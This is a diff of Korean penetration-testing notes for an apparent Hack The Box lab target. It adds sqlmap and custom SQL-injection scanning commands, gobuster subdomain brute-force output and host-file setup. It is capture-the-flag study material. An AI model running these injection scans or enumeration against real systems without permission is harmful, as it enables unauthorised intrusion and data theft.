@@ -113,8 +113,9 @@ sqlmap -u "http://planning.htb/detail.php?id=1" --dbs --batch
 sqlmap -u "http://planning.htb/detail.php?id=1" -D database_name --tables --batch
 
 # SQL 인젝션 사용 금지로 인해 자체 스크립트 사용
-/vpn/scan/SQLi.sh -u "http://planning.htb/detail.php?id=1" --payloads /vpn/SQLi
-
+# /etc/hosts 추가
+/vpn/scan/SQLi.sh -u "http://planning.htb/detail.php?id=1" --payloads /vpn/SQLi/Generic-SQLi.txt
+/vpn/scan/debug_sqli.sh http://planning.hub/detail.php?id=1 /vpn/SQLi
 
 
 # 고부스터용 파일 합치기 서브도메인 DNS
@@ -126,10 +127,33 @@ gobuster dns -d planning.htb -w /tmp/combined_subdomains.txt -t 50 -o subdomain_
 
 
 
-##### 서브도메인 검색 결과
+# 서브도메인 검색 결과
+┌──(root㉿codespaces-38cdce)-[/]
+└─# gobuster dns -d planning.htb -w /tmp/combined_subdomains.txt -t 50 -o subdomain_result.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Domain:     planning.htb
+[+] Threads:    50
+[+] Timeout:    1s
+[+] Wordlist:   /tmp/combined_subdomains.txt
+===============================================================
+Starting gobuster in DNS enumeration mode
+===============================================================
+Found: grafana.planning.htb
+
+Progress: 1618280 / 1618281 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+┌──(root㉿codespaces-38cdce)-[/]
+└─# cat subdomain_result.txt 
+Found: grafana.planning.htb
 
 
-# 그라파나 서브도메인 발견
+# 그라파나 서브도메인 발견 -> DNS 설정
 echo "10.10.11.68 grafana.planning.htb" >> /etc/hosts
 curl -L http://grafana.planning.htb
 
